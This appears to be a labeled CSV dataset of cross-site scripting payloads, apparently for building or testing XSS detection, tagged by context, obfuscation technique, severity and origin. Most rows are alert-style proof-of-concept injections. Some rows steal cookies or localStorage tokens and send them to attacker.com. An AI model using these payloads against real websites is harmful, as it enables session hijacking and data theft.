payload,context,technique,severity,length,source
%3Ctable onsearch=prompt(1)/%3E,tag_injection,synthetic,medium,31,synthetic
%3C!--%3E%3Cmath onplaying=console.log('XSS')%3E,tag_injection,synthetic,medium,48,synthetic
\%22 ondrop=alert(%27XSS%27)//,attribute_escape,synthetic,medium,30,synthetic
' ><svg onclose=alert(document.domain)>,attribute_escape,synthetic,medium,39,synthetic
<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,tag_injection,none,medium,68,real
%3Clisting/onpointerrawupdate=alert('XSS')%3E,tag_injection,synthetic,medium,45,synthetic
/<script>alert(1234)</script>,script_injection,none,medium,29,real
"<svg xmlns=""#""><script>alert(1)</script></svg>",script_injection,none,medium,46,real
"<script>/x/alert(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,56,synthetic
%22><img src=x onpaste=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
"?clickTAG=javascript:alert(1)"",",js_uri,none,medium,31,real
<scr	ipt	>prompt(location.hash)</scr	ipt>,script_injection,synthetic,medium,41,synthetic
<blInk	onKeyPreSs=ProMpt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,42,synthetic
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",script_injection,none,medium,103,real
<obj&#101;ct on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,89,synthetic
&quot; onblur=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
"__proto__[""onmozfullscreenchange""]=\u0061lert('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,83,synthetic
"<style>@keyframes slidein {}</style><q style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></q>",tag_injection,none,medium,162,real
'><img src=x onended=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
""" %3E%3Csvg onkeydown=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,62,synthetic
document.body.innerHTML=%22<img src=x onerror=console.log(document.domain)>%22,dom_sink,synthetic,high,78,synthetic
%27 onpageshow=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,41,synthetic
"'><img src=x on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,96,synthetic
"<embed src=""data:text/html;base64,%(base64)s"">",js_uri,none,low,46,real
"(neW FUncTioN(""AleRt(1)""))();",dom_sink,synthetic,high,29,synthetic
""" ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1) """,attribute_escape,synthetic,low,55,synthetic
%3Cspan src=x onbeforetoggle=prompt(location.hash)%3E,tag_injection,synthetic,medium,53,synthetic
' oNpoIntEroVer=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,36,synthetic
javascript:console.log(location.hash),js_uri,synthetic,medium,37,synthetic
"<auDio
onPlaY=cOnsOle.loG(1)>",tag_injection,synthetic,medium,29,synthetic
"<noscript draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",tag_injection,none,medium,89,real
"<img src=""javascript:alert(9323)"">",js_uri,none,medium,34,real
""" onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,70,synthetic
"""><base onpageswap=\u0061lert('XSS')>",tag_injection,synthetic,low,37,synthetic
&quOt; onEndEd=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,36,synthetic
{{ alert(1) }},template_injection,synthetic,medium,14,synthetic
"${{'\u0061lert(document.cookie)'.replace('\u0061lert(document.cookie)','')}}",template_injection,synthetic,high,76,synthetic
"<div src=x onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,75,synthetic
${alert?new()('document.domain')},template_injection,synthetic,low,33,synthetic
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,generic,html_entity,medium,54,real
"%E5%98%8D%E5%98%8A%20""><img src=x onerror=prompt(document.domain);>",dom_sink,url_encoding,medium,67,real
<ins onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</ins><input value=clickme>,tag_injection,none,medium,106,real
"<style>:target {color: red;}</style><input4 id=x style=""transition:color 10s"" ontransitioncancel=print()></input4>",tag_injection,none,low,114,real
&quot; onfocus=consol&#101;.log(1) x=&quot;,attribute_escape,synthetic,low,43,synthetic
"""%3E%3Cimg src=x onpointermove=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,70,synthetic
\' onfullscreenchange=alert(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
"<u draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</u>",tag_injection,none,medium,75,real
"element.setAttribute(%22onclick%22,%22confirm(document.cookie+%27&loc=%27+location.href)%22)",dom_sink,synthetic,high,92,synthetic
""" oNplAyiNg=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,52,synthetic
%22 onmousedown=alert(location.hash) %22,attribute_escape,synthetic,medium,40,synthetic
' on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,49,synthetic
""" ><svG oNloAd=ConSolE.lOg(1)>",attribute_escape,synthetic,medium,30,synthetic
{{cOnsTruCtoR.cOnsTruCtoR('ConFirM(dOcuMenT.cOokIe)')()}},template_injection,synthetic,high,57,synthetic
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",tag_injection,none,medium,89,real
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,97,synthetic
"<blockquote onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></blockquote>",tag_injection,none,medium,293,real
""" on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,56,synthetic
`%3E%3Cimg src=x onpagereveal=alert(location.hash)%3E,attribute_escape,synthetic,medium,53,synthetic
\u003e\u003cimg src=1 onerror=alert(0)\u003e,event_handler,unicode_escape,medium,44,real
(new Function(%22console.log(document.domain)%22))();,dom_sink,synthetic,high,53,synthetic
{{prompt(docum&#101;nt.dom&#97;in)}},template_injection,synthetic,medium,36,synthetic
"<meta draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",tag_injection,none,medium,86,real
"""%3E%3Cimg src=x onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
"'%3E%3Cimg src=x oninvalid=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
"' onreset=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,54,synthetic
"<nav onclick=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,63,real
%3Canimatemotion onanimationiteration=console.log('XSS')/%3E,tag_injection,synthetic,medium,60,synthetic
"<summary onclick=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,71,real
<frame onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67,real
%22 onscrollsnapchange=console.log(1) %22,attribute_escape,synthetic,medium,41,synthetic
<video id=x tabindex=1 onactivate=alert(1)></video>,tag_injection,none,medium,51,real
"\%27 ontransitionstart=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,63,synthetic
"<sup onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sup>",tag_injection,none,medium,82,real
"<script>alert(String.fromCharCode(88,83,83))</script>",script_injection,encoding,high,53,real
{{&#97;l&#101;rt(1)}},template_injection,synthetic,low,21,synthetic
"document.write(""%3Cimg src=x onerror=alert('XSS')%3E"")",dom_sink,synthetic,medium,54,synthetic
<summary id=x tabindex=1 onfocus=alert(1)></summary>,tag_injection,none,medium,52,real
<title onblur=console.log(location.hash) onblur=console.log(location.hash)>,tag_injection,synthetic,medium,75,synthetic
<input2 onpointerup=alert(1) style=display:block>AnonKryptiQuz</input2>,tag_injection,none,medium,71,real
"<audio onclick=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",tag_injection,none,medium,67,real
""" ong&#101;stur&#101;&#101;nd=prompt('XSS') """,attribute_escape,synthetic,medium,45,synthetic
%3Cblink	onmouseup=alert(1)%3E,tag_injection,synthetic,medium,30,synthetic
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",script_injection,none,medium,69,real
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt,event_handler,html_entity|url_encoding,low,58,real
' onlo&#97;d=&#97;l&#101;rt(1) ',attribute_escape,synthetic,low,32,synthetic
'><Img srC=x onPagEhiDe=AleRt(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,45,synthetic
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",js_uri,none,medium,90,real
<di&#97;log	onst&#97;ll&#101;d=confirm('XSS')>,tag_injection,synthetic,medium,46,synthetic
OntRanSitIonStaRt=ConSolE.lOg&#40;'XSS'&#41;,event_handler,synthetic,low,44,synthetic
"""%3E%3Cselect onvolumechange=console.log(1)%3E",tag_injection,synthetic,medium,46,synthetic
onplaying=javascr	ipt:console.log(1),event_handler,synthetic,medium,36,synthetic
"\"" OnpOinTerUp=ProMpt(loCatIon.haSh)//",attribute_escape,synthetic,medium,38,synthetic
<video autoplay onplay=alert`AnonKryptiQuz` src=//w3schools.com/tags/movie.mp4>,tag_injection,none,low,79,real
<pre onpointerleave=alert(1) style=display:block>AnonKryptiQuz</pre>,tag_injection,none,medium,68,real
"<q onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</q>",tag_injection,none,medium,57,real
"<obj&#101;ct
onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1)>",tag_injection,synthetic,low,60,synthetic
"<option onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></option>",tag_injection,none,medium,285,real
"document.write(""%3Cimg src=x onerror=fetch(location.hash)%3E"")",dom_sink,synthetic,high,62,synthetic
"	onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,58,synthetic
java	scr	ipt:prompt('XSS'),js_uri,synthetic,medium,26,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#97;l&#101;rt(1)>"")",dom_sink,synthetic,low,128,synthetic
`><img src=x ondr&#97;g&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,72,synthetic
"<svg onUnload svg onUnload=""javascript:javascript:alert(8161)""></svg onUnload>",js_uri,none,medium,78,real
 onpointermove=\u0061lert(document.domain),event_handler,synthetic,low,42,synthetic
"""'><img src=xxx:x \x09onerror=javascript:alert(1)>",js_uri,none,medium,50,real
' ontouchmov&#101;=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,44,synthetic
"<input draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</input>",tag_injection,none,medium,86,real
"""><meta onpointerover=confirm(1)>",tag_injection,synthetic,medium,33,synthetic
"<menu onclick=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,65,real
%3Canimatemotion x=y ondblclick=console.log(1)%3E,tag_injection,synthetic,medium,49,synthetic
' ><svG oNgeStuResTarT=pRomPt('XSS')>,attribute_escape,synthetic,medium,37,synthetic
"' ><svg on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,101,synthetic
"""><video ondragstart=\u0061lert('XSS')>",tag_injection,synthetic,low,39,synthetic
<xss x=y onkeypress=console.log(1)>,tag_injection,synthetic,medium,35,synthetic
&quOt; onTouChmOve=prOmpT('XSS') X=&QuoT;,attribute_escape,synthetic,medium,41,synthetic
<emBed/onMozFulLscReeNchAngE=cOnfIrm(loCatIon.haSh)>,tag_injection,synthetic,medium,52,synthetic
document.body.innerHTML=%22<img src=x onerror=XMLHttpRequest(document.domain)>%22,dom_sink,synthetic,high,81,synthetic
"%22><marquee onpromptdismiss=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,72,synthetic
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></audio2>",tag_injection,none,medium,105,real
#prOmpT(1),template_injection,synthetic,medium,10,synthetic
"<style>:target {transform: rotate(180deg);}</style><meter id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meter>",tag_injection,none,medium,128,real
OnpRomPtaCtiOn=ConFirM&#40;1&#41;,event_handler,synthetic,low,33,synthetic
'><Img srC=x onMouSewHeeL=aLerT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,47,synthetic
"\' onscrollend=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
"`><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,106,synthetic
'><img src=x ong&#101;stur&#101;&#101;nd=confirm('XSS')>,attribute_escape,synthetic,medium,56,synthetic
"(neW FUncTioN(""EvaL('XSS')""))();",dom_sink,synthetic,high,32,synthetic
<&#97;nim&#97;t&#101;tr&#97;nsform/onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,83,synthetic
"&lt;XML SRC=\""xssAnonKryptiQuz&#46;xml\"" ID=I&gt;&lt;/XML&gt;",generic,html_entity,low,61,real
"oncut=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,43,synthetic
`><img src=x onfullscreenchange=alert(location.hash)>,attribute_escape,synthetic,medium,53,synthetic
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
%3C!--%3E%3Cobject onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,60,synthetic
 onSelEct=prOmpT(lOcaTioN.hAsh),event_handler,synthetic,medium,31,synthetic
"""><Img srC=x onPagEreVeaL=pRomPt(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
' ><svg ons&#101;&#97;rch=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,59,synthetic
\' OnlOad=alErt(1)//,attribute_escape,synthetic,medium,20,synthetic
{{pRomPt DocUmeNt.DomAin}},template_injection,synthetic,low,26,synthetic
"""><img src=x onr&#101;s&#101;t=&#97;l&#101;rt('XSS')>",attribute_escape,synthetic,low,53,synthetic
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,tag_injection,none,medium,69,real
"%22><plaintext onpause=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,66,synthetic
"\"" onauxclick=prompt(location.hash)//",attribute_escape,synthetic,medium,37,synthetic
"<dialog onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",tag_injection,none,medium,65,real
OnfOcuSouT=cOnfIrm/**/(lOcaTioN.hAsh),event_handler,synthetic,low,37,synthetic
' oNreSet=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
onmouseup=javascr	ipt:console.log('XSS'),event_handler,synthetic,medium,40,synthetic
onw&#97;iting=confirm&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,55,synthetic
""" on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,68,synthetic
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",dom_sink,none,low,57,real
%27 oncut=console.log(1) %27,attribute_escape,synthetic,medium,28,synthetic
%3Cobject onanimationcancel=alert(document.domain)%3E,tag_injection,synthetic,medium,53,synthetic
"<noscr	ipt onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,64,synthetic
"/""/_javascript:prompt(/xss/.source);var x = prompt;x(0);x(/AnonKryptiQuz/.source);x",js_uri,none,medium,83,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(%27XSS%27)>%22)",dom_sink,synthetic,medium,86,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=\u0061lert(location.hash)>"")",dom_sink,synthetic,low,87,synthetic
%3Csvg/onbeforecopy=prompt(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,low,95,synthetic
&#X03c,generic,html_entity,low,6,real
"OndRop=coNfiRm&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler,synthetic,high,53,synthetic
"""\"">"" + ""<img src=x onerror=prompt('AnonKryptiQuz')>"" + ""\""""",tag_injection,none,medium,60,real
onpointerover=javascript:prompt(document.domain),event_handler,synthetic,medium,48,synthetic
onmouseenter=javascript:alert('XSS'),event_handler,synthetic,medium,36,synthetic
oninput=\u0061lert/**/(1),event_handler,synthetic,low,25,synthetic
(new Function(%22eval(document.cookie)%22))();,dom_sink,synthetic,high,46,synthetic
"\"" onpointerover=console.log('XSS')//",attribute_escape,synthetic,medium,37,synthetic
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></address>",tag_injection,none,medium,117,real
""" ><svg ondrop=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,46,synthetic
onsearch=javascript:console.log('XSS'),event_handler,synthetic,medium,38,synthetic
"<a href=""\x00javascript:javascript:alert(5992)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<set
onwebkitfullscreenchange=console.log('XSS')>",tag_injection,synthetic,medium,49,synthetic
"%27 ><svg onbeforepaste=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,tag_injection,none,medium,106,real
JavAscRipT:cOnfIrm(1),js_uri,synthetic,medium,21,synthetic
' ><svg onvolumechange=alert(document.domain)>,attribute_escape,synthetic,medium,46,synthetic
\' OnpAgeRevEal=coNsoLe.Log(doCumEnt.doMaiN)//,attribute_escape,synthetic,medium,46,synthetic
&quot; onmous&#101;down=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,70,synthetic
"<set
onpointermove=confirm(location.hash)>",tag_injection,synthetic,medium,42,synthetic
__proto__[%22onvolumechange%22]=alert(location.hash),dom_sink,synthetic,medium,52,synthetic
&quOt; onAniMatIonIteRatIon=coNsoLe.Log('XSS') x=&qUot;,attribute_escape,synthetic,medium,55,synthetic
<isindex type=image src=1 onerror=alert(1)>,tag_injection,none,medium,43,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))>""",dom_sink,synthetic,high,113,synthetic
<seT	oNenD=aLerT(1)>,tag_injection,synthetic,medium,20,synthetic
<animatetransform onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</animatetransform><input value=clickme>,tag_injection,none,medium,123,real
<xmp ontr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ontr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,131,synthetic
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figcaption>",tag_injection,none,medium,138,real
onplaying=console.log/***/(location.hash),event_handler,synthetic,low,41,synthetic
%22><img src=x onload=alert(1)>,attribute_escape,synthetic,medium,31,synthetic
<table onpointerdown=alert(1) style=display:block>AnonKryptiQuz</table>,tag_injection,none,medium,71,real
{{{&#97;l&#101;rt(1)}}},template_injection,synthetic,low,23,synthetic
""" ><svG oNdrOp=ConFirM(dOcuMenT.dOmaIn)>",attribute_escape,synthetic,medium,40,synthetic
<video x=y ondragstart=alert(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
%22><form onwaiting=confirm(1)>,tag_injection,synthetic,medium,31,synthetic
onbeforeinput=console.log(document.domain),event_handler,synthetic,medium,42,synthetic
"OnpRomPtdIsmIss=prOmpT/**/(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,57,synthetic
	onfocusin=confirm(%27XSS%27),event_handler,synthetic,medium,29,synthetic
"`><img src=x onw&#97;iting=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,74,synthetic
"loc&#97;tion=""j&#97;v&#97;script:prompt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,medium,99,synthetic
"`><img src=x onk&#101;ypr&#101;ss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,91,synthetic
OnhAshChaNge=alErt&#40;'XSS'&#41;,event_handler,synthetic,low,33,synthetic
onstalled=console.log&#40;1&#41;,event_handler,synthetic,low,32,synthetic
"<legend onmouseup=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,51,real
"<blink draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",tag_injection,none,medium,88,real
<strong onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</strong>,tag_injection,none,medium,78,real
""" oNplAy=ConFirM('XSS') """,attribute_escape,synthetic,medium,25,synthetic
' %3E%3Csvg onpagereveal=console.log(document.domain)%3E,attribute_escape,synthetic,medium,56,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable style=display:block>drop here</rtc>",tag_injection,none,medium,127,real
"DatA:tExt/htMl,<scRipT>cOnfIrm(loCatIon.haSh)</sCriPt>",js_uri,synthetic,medium,54,synthetic
#set($x=%27confirm(1)%27)$x,template_injection,synthetic,medium,27,synthetic
"onpause=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,50,synthetic
<xmp onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65,real
""" onb&#101;for&#101;cut=confirm(1) """,attribute_escape,synthetic,medium,36,synthetic
<wbr onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65,real
"__proto__[""ongesturestart""]=eval(localStorage.getItem('token'))",dom_sink,synthetic,high,63,synthetic
"<form onmousemove=""alert(1)"">AnonKryptiQuz</form>",tag_injection,none,medium,49,real
"<aside onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",tag_injection,none,medium,66,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""print()""></title>",tag_injection,none,low,179,real
‘ onfocus=’alert(1)’ autofocus=’,event_handler,none,medium,32,real
<noscript/ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,38,synthetic
<object/onanimationcancel=\u0061lert(document.domain)>,tag_injection,synthetic,low,54,synthetic
"<mark onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",tag_injection,none,medium,68,real
"<sub draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,64,real
"\' OnfOcuS=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,55,synthetic
"<math
oncopy=console.log(document.domain)>",tag_injection,synthetic,medium,42,synthetic
`><img src=x onfocusin=console.log(location.hash)>,attribute_escape,synthetic,medium,50,synthetic
"""><Img srC=x onFocUs=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
""" onpl&#97;ying=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,55,synthetic
' ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,low,58,synthetic
"OnpAusE=cOnsOle.loG&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler,synthetic,high,58,synthetic
"\"" OngEstUreStaRt=ProMpt('XSS')//",attribute_escape,synthetic,medium,33,synthetic
""" ><svg onclose=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",tag_injection,none,medium,106,real
嘾嘾<script>alert(2);</script>,script_injection,none,medium,28,real
"<track onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</track>",tag_injection,none,medium,65,real
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(4318)""></html onMouseOver>",js_uri,none,medium,90,real
"<image3 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,71,real
"<kbd onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,67,real
"eval(""eval(document.cookie+'&loc='+location.href)"")",dom_sink,synthetic,high,51,synthetic
"eval(""console.log(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink,synthetic,high,75,synthetic
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(8716))"">",js_uri,comment_injection|case_variation,medium,59,real
" onPagEreVeaL=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,50,synthetic
%3Cobject ontouchstart=console.log(location.hash)/%3E,tag_injection,synthetic,medium,53,synthetic
\' ongesturestart=prompt('XSS')//,attribute_escape,synthetic,medium,33,synthetic
&quot; onpoint&#101;rov&#101;r=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,medium,70,synthetic
"loc&#97;tion=""j&#97;v&#97;script:confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,medium,100,synthetic
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,tag_injection,none,medium,62,real
"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",tag_injection,none,medium,75,real
"<style>:target {color: red;}</style><iframe2 id=x style=""transition:color 10s"" ontransitioncancel=print()></iframe2>",tag_injection,none,low,116,real
%3Canimatetransform	onpointermove=console.log('XSS')%3E,tag_injection,synthetic,medium,55,synthetic
""" onbeforepaste=console.log('XSS') """,attribute_escape,synthetic,medium,36,synthetic
"<nav draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</nav>",tag_injection,none,medium,64,real
""" ondblclick=\u0061lert(1) """,attribute_escape,synthetic,low,28,synthetic
"<option onmousemove=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,53,real
<dialog onplay=prompt(document.domain) onplay=prompt(document.domain)>,tag_injection,synthetic,medium,70,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,low,159,synthetic
